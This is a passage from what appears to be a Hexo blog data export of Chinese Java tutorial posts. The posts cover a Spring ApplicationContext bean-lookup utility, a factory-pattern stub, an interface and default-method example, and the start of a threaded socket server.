com.bonc.sms.util;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.stereotype.Component;\n\n/**\n * 普通类调用Spring bean对象：\n */\n@Component\npublic class SpringUtil implements ApplicationContextAware{\n\tprivate static ApplicationContext applicationContext = null;\n\n\t@Override\n\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n\t   if(SpringUtil.applicationContext == null){\n\t\t   SpringUtil.applicationContext  = applicationContext;\n\t   }\n\t}\n\n\t//获取applicationContext\n\tpublic static ApplicationContext getApplicationContext() {\n\t   return applicationContext;\n\t}\n\n\t//通过name获取 Bean.\n\tpublic static Object getBean(String name){\n\t   return getApplicationContext().getBean(name);\n\t}\n\n\t//通过class获取Bean.\n\tpublic static <T> T getBean(Class<T> clazz){\n\t   return getApplicationContext().getBean(clazz);\n\t}\n\n\t//通过name,以及Clazz返回指定的Bean\n\tpublic static <T> T getBean(String name,Class<T> clazz){\n\t   return getApplicationContext().getBean(name, clazz);\n\t}\n}\n```\n\n###### 2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\n1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用\n```\n@SpringBootApplication\npublic class App{\n\tpublic static void main( String[] args ){\n\t\tSystem.out.println( \"Hello World!\" );\n\t\tApplicationContext app = SpringApplication.run(App.class, args);\n\t\tSpringUtil.setApplicationContext(app);\n\t}\n}\n```\n2.解决办法\n```\n//在启动类上加@ComponentScan注解\n@SpringBootApplication\n@ComponentScan(basePackages = \"com.***\")\npublic class SmsUpstreamApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(SmsUpstreamApplication.class, args);\n    }\n\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(SmsUpstreamApplication.class);\n    }\n}\n```\n###### 3.在普通类中通过getBean()获取\n```\n//导入Logservice\nLogService logService = (LogService) SpringUtil.getBean(LogService.class);\n```\n","source":"_posts/java/Spring上下文.md","raw":"---\ntitle: Spring上下文\ndate: 2018-08-30 16:34:21\ntags: [springboot, java]\n---\n\n非spring管理的类（普通类），获得一个Bean。\n在一个普通类中，@Autowired和new都不能导入一个Bean对象\n```\npublic class AcceptDeal extends Thread {\n  @Autowired\n  LogService logservice;//但此时mapper中信息又为null\n  //或者new 一个对象\n  //LogService logservice = new LogService();//此时mapper又不能导入\n}\n```\n解决方案：使用Spring上下文，获取Bean\n\n###### 1.新建一个工具类SpringUtil\n可以根据自己的需要添加上下文相关的管理方法\n```\npackage com.bonc.sms.util;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.stereotype.Component;\n\n/**\n * 普通类调用Spring bean对象：\n */\n@Component\npublic class SpringUtil implements ApplicationContextAware{\n\tprivate static ApplicationContext applicationContext = null;\n\n\t@Override\n\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n\t   if(SpringUtil.applicationContext == null){\n\t\t   SpringUtil.applicationContext  = applicationContext;\n\t   }\n\t}\n\n\t//获取applicationContext\n\tpublic static ApplicationContext getApplicationContext() {\n\t   return applicationContext;\n\t}\n\n\t//通过name获取 Bean.\n\tpublic static Object getBean(String name){\n\t   return getApplicationContext().getBean(name);\n\t}\n\n\t//通过class获取Bean.\n\tpublic static <T> T getBean(Class<T> clazz){\n\t   return getApplicationContext().getBean(clazz);\n\t}\n\n\t//通过name,以及Clazz返回指定的Bean\n\tpublic static <T> T getBean(String name,Class<T> clazz){\n\t   return getApplicationContext().getBean(name, clazz);\n\t}\n}\n```\n\n###### 2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\n1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用\n```\n@SpringBootApplication\npublic class App{\n\tpublic static void main( String[] args ){\n\t\tSystem.out.println( \"Hello World!\" );\n\t\tApplicationContext app = SpringApplication.run(App.class, args);\n\t\tSpringUtil.setApplicationContext(app);\n\t}\n}\n```\n2.解决办法\n```\n//在启动类上加@ComponentScan注解\n@SpringBootApplication\n@ComponentScan(basePackages = \"com.***\")\npublic class SmsUpstreamApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(SmsUpstreamApplication.class, args);\n    }\n\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(SmsUpstreamApplication.class);\n    }\n}\n```\n###### 3.在普通类中通过getBean()获取\n```\n//导入Logservice\nLogService logService = (LogService) SpringUtil.getBean(LogService.class);\n```\n","slug":"java/Spring上下文","published":1,"updated":"2018-12-03T09:00:16.847Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051c000n6cvpirezjyn9","content":"<p>非spring管理的类（普通类），获得一个Bean。<br>在一个普通类中，@Autowired和new都不能导入一个Bean对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\">  @Autowired</span><br><span class=\"line\">  LogService logservice;//但此时mapper中信息又为null</span><br><span class=\"line\">  //或者new 一个对象</span><br><span class=\"line\">  //LogService logservice = new LogService();//此时mapper又不能导入</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>解决方案：使用Spring上下文，获取Bean</p>\n<h6 id=\"1-新建一个工具类SpringUtil\"><a href=\"#1-新建一个工具类SpringUtil\" class=\"headerlink\" title=\"1.新建一个工具类SpringUtil\"></a>1.新建一个工具类SpringUtil</h6><p>可以根据自己的需要添加上下文相关的管理方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.BeansException;</span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.ApplicationContextAware;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 普通类调用Spring bean对象：</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class SpringUtil implements ApplicationContextAware&#123;</span><br><span class=\"line\">\tprivate static ApplicationContext applicationContext = null;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;</span><br><span class=\"line\">\t   if(SpringUtil.applicationContext == null)&#123;</span><br><span class=\"line\">\t\t   SpringUtil.applicationContext  = applicationContext;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//获取applicationContext</span><br><span class=\"line\">\tpublic static ApplicationContext getApplicationContext() &#123;</span><br><span class=\"line\">\t   return applicationContext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name获取 Bean.</span><br><span class=\"line\">\tpublic static Object getBean(String name)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过class获取Bean.</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name,以及Clazz返回指定的Bean</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(String name,Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name, clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"><a href=\"#2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\" class=\"headerlink\" title=\"2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"></a>2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext</h6><p>1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class App&#123;</span><br><span class=\"line\">\tpublic static void main( String[] args )&#123;</span><br><span class=\"line\">\t\tSystem.out.println( &quot;Hello World!&quot; );</span><br><span class=\"line\">\t\tApplicationContext app = SpringApplication.run(App.class, args);</span><br><span class=\"line\">\t\tSpringUtil.setApplicationContext(app);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//在启动类上加@ComponentScan注解</span><br><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">@ComponentScan(basePackages = &quot;com.***&quot;)</span><br><span class=\"line\">public class SmsUpstreamApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(SmsUpstreamApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(SmsUpstreamApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-在普通类中通过getBean-获取\"><a href=\"#3-在普通类中通过getBean-获取\" class=\"headerlink\" title=\"3.在普通类中通过getBean()获取\"></a>3.在普通类中通过getBean()获取</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//导入Logservice</span><br><span class=\"line\">LogService logService = (LogService) SpringUtil.getBean(LogService.class);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>非spring管理的类（普通类），获得一个Bean。<br>在一个普通类中，@Autowired和new都不能导入一个Bean对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\">  @Autowired</span><br><span class=\"line\">  LogService logservice;//但此时mapper中信息又为null</span><br><span class=\"line\">  //或者new 一个对象</span><br><span class=\"line\">  //LogService logservice = new LogService();//此时mapper又不能导入</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>解决方案：使用Spring上下文，获取Bean</p>\n<h6 id=\"1-新建一个工具类SpringUtil\"><a href=\"#1-新建一个工具类SpringUtil\" class=\"headerlink\" title=\"1.新建一个工具类SpringUtil\"></a>1.新建一个工具类SpringUtil</h6><p>可以根据自己的需要添加上下文相关的管理方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.BeansException;</span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.ApplicationContextAware;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 普通类调用Spring bean对象：</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class SpringUtil implements ApplicationContextAware&#123;</span><br><span class=\"line\">\tprivate static ApplicationContext applicationContext = null;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;</span><br><span class=\"line\">\t   if(SpringUtil.applicationContext == null)&#123;</span><br><span class=\"line\">\t\t   SpringUtil.applicationContext  = applicationContext;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//获取applicationContext</span><br><span class=\"line\">\tpublic static ApplicationContext getApplicationContext() &#123;</span><br><span class=\"line\">\t   return applicationContext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name获取 Bean.</span><br><span class=\"line\">\tpublic static Object getBean(String name)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过class获取Bean.</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name,以及Clazz返回指定的Bean</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(String name,Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name, clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"><a href=\"#2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\" class=\"headerlink\" title=\"2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"></a>2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext</h6><p>1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class App&#123;</span><br><span class=\"line\">\tpublic static void main( String[] args )&#123;</span><br><span class=\"line\">\t\tSystem.out.println( &quot;Hello World!&quot; );</span><br><span class=\"line\">\t\tApplicationContext app = SpringApplication.run(App.class, args);</span><br><span class=\"line\">\t\tSpringUtil.setApplicationContext(app);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//在启动类上加@ComponentScan注解</span><br><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">@ComponentScan(basePackages = &quot;com.***&quot;)</span><br><span class=\"line\">public class SmsUpstreamApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(SmsUpstreamApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(SmsUpstreamApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-在普通类中通过getBean-获取\"><a href=\"#3-在普通类中通过getBean-获取\" class=\"headerlink\" title=\"3.在普通类中通过getBean()获取\"></a>3.在普通类中通过getBean()获取</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//导入Logservice</span><br><span class=\"line\">LogService logService = (LogService) SpringUtil.getBean(LogService.class);</span><br></pre></td></tr></table></figure>\n"},{"title":"factorypattern","date":"2018-11-07T02:09:18.000Z","_content":"#### 1.工厂模式\n让创建对象变得简单而且修改对象时能很方便.\n","source":"_posts/java/factorypattern.md","raw":"---\ntitle: factorypattern\ndate: 2018-11-07 10:09:18\ntags: [java]\n---\n#### 1.工厂模式\n让创建对象变得简单而且修改对象时能很方便.\n","slug":"java/factorypattern","published":1,"updated":"2019-01-21T09:06:49.330Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051f000p6cvpfmamwljl","content":"<h4 id=\"1-工厂模式\"><a href=\"#1-工厂模式\" class=\"headerlink\" title=\"1.工厂模式\"></a>1.工厂模式</h4><p>让创建对象变得简单而且修改对象时能很方便.</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-工厂模式\"><a href=\"#1-工厂模式\" class=\"headerlink\" title=\"1.工厂模式\"></a>1.工厂模式</h4><p>让创建对象变得简单而且修改对象时能很方便.</p>\n"},{"title":"interface","date":"2019-01-21T06:26:34.000Z","_content":"\n[接口与抽象类区别](https://blog.csdn.net/u010466329/article/details/78133282)\n\n### 一.例子\n```\npackage base.interfacedemo;\n\n//定义一个接口\ninterface TestInterface {\n\n    void test();\n\n    //接口静态内部类实现 默认 public static final\n    //方便扩展\n    TestInterface Demo1 = new TestInterface() {\n        @Override\n        public void test() {\n            System.out.println(\"test1\");\n        }\n    };\n\n    //default方法 java8新特性\n    default void Demo3(){\n       System.out.println(\"test3\");\n    }\n}\n\n//正常的接口实现\nclass Demo2 implements TestInterface{\n    @Override\n    public void test(){\n        System.out.println(\"test2\");\n    }\n}\n\npublic class DemoInterface{\n\n    public static void main(String[] args){\n        TestInterface.Demo1.test();\n        new Demo2().test();\n        Demo2 demo3 = new Demo2();\n        demo3.Demo3();\n    }\n}\n```\n","source":"_posts/java/interface.md","raw":"---\ntitle: interface\ndate: 2019-01-21 14:26:34\ntags: [java]\n---\n\n[接口与抽象类区别](https://blog.csdn.net/u010466329/article/details/78133282)\n\n### 一.例子\n```\npackage base.interfacedemo;\n\n//定义一个接口\ninterface TestInterface {\n\n    void test();\n\n    //接口静态内部类实现 默认 public static final\n    //方便扩展\n    TestInterface Demo1 = new TestInterface() {\n        @Override\n        public void test() {\n            System.out.println(\"test1\");\n        }\n    };\n\n    //default方法 java8新特性\n    default void Demo3(){\n       System.out.println(\"test3\");\n    }\n}\n\n//正常的接口实现\nclass Demo2 implements TestInterface{\n    @Override\n    public void test(){\n        System.out.println(\"test2\");\n    }\n}\n\npublic class DemoInterface{\n\n    public static void main(String[] args){\n        TestInterface.Demo1.test();\n        new Demo2().test();\n        Demo2 demo3 = new Demo2();\n        demo3.Demo3();\n    }\n}\n```\n","slug":"java/interface","published":1,"updated":"2019-01-21T09:06:15.088Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051h000q6cvp19701ge8","content":"<p><a href=\"https://blog.csdn.net/u010466329/article/details/78133282\" target=\"_blank\" rel=\"noopener\">接口与抽象类区别</a></p>\n<h3 id=\"一-例子\"><a href=\"#一-例子\" class=\"headerlink\" title=\"一.例子\"></a>一.例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package base.interfacedemo;</span><br><span class=\"line\"></span><br><span class=\"line\">//定义一个接口</span><br><span class=\"line\">interface TestInterface &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    void test();</span><br><span class=\"line\"></span><br><span class=\"line\">    //接口静态内部类实现 默认 public static final</span><br><span class=\"line\">    //方便扩展</span><br><span class=\"line\">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void test() &#123;</span><br><span class=\"line\">            System.out.println(&quot;test1&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //default方法 java8新特性</span><br><span class=\"line\">    default void Demo3()&#123;</span><br><span class=\"line\">       System.out.println(&quot;test3&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//正常的接口实现</span><br><span class=\"line\">class Demo2 implements TestInterface&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void test()&#123;</span><br><span class=\"line\">        System.out.println(&quot;test2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class DemoInterface&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        TestInterface.Demo1.test();</span><br><span class=\"line\">        new Demo2().test();</span><br><span class=\"line\">        Demo2 demo3 = new Demo2();</span><br><span class=\"line\">        demo3.Demo3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://blog.csdn.net/u010466329/article/details/78133282\" target=\"_blank\" rel=\"noopener\">接口与抽象类区别</a></p>\n<h3 id=\"一-例子\"><a href=\"#一-例子\" class=\"headerlink\" title=\"一.例子\"></a>一.例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package base.interfacedemo;</span><br><span class=\"line\"></span><br><span class=\"line\">//定义一个接口</span><br><span class=\"line\">interface TestInterface &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    void test();</span><br><span class=\"line\"></span><br><span class=\"line\">    //接口静态内部类实现 默认 public static final</span><br><span class=\"line\">    //方便扩展</span><br><span class=\"line\">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void test() &#123;</span><br><span class=\"line\">            System.out.println(&quot;test1&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //default方法 java8新特性</span><br><span class=\"line\">    default void Demo3()&#123;</span><br><span class=\"line\">       System.out.println(&quot;test3&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//正常的接口实现</span><br><span class=\"line\">class Demo2 implements TestInterface&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void test()&#123;</span><br><span class=\"line\">        System.out.println(&quot;test2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class DemoInterface&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        TestInterface.Demo1.test();</span><br><span class=\"line\">        new Demo2().test();</span><br><span class=\"line\">        Demo2 demo3 = new Demo2();</span><br><span class=\"line\">        demo3.Demo3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"javasocket","date":"2018-09-26T09:49:23.000Z","_content":"\n#### 1.java.net.socket\nserver端代码，使用子线程处理连接\n```\n@Controller\npublic class SocketController {\n    private final static Log logger = LogFactory.getLog(SocketController.class);\n\n    public void accept(){\n        try{\n            ServerSocket socketServer = new ServerSocket(8888);\n            logger.info(\"socket启动，保持监听。。。\");\n            //保持监听,同时连接多个\n            while (true){\n                Socket socket = socketServer.accept();\n                logger.info(\"子socket开始.....\");\n                new DispatchRequestThread(socket).start();\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 处理socket线程类\n     */\n    class DispatchRequestThread extends Thread {\n\n        BufferedReader in;\n        PrintWriter out;\n        Socket socket;\n\n        public DispatchRequestThread(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                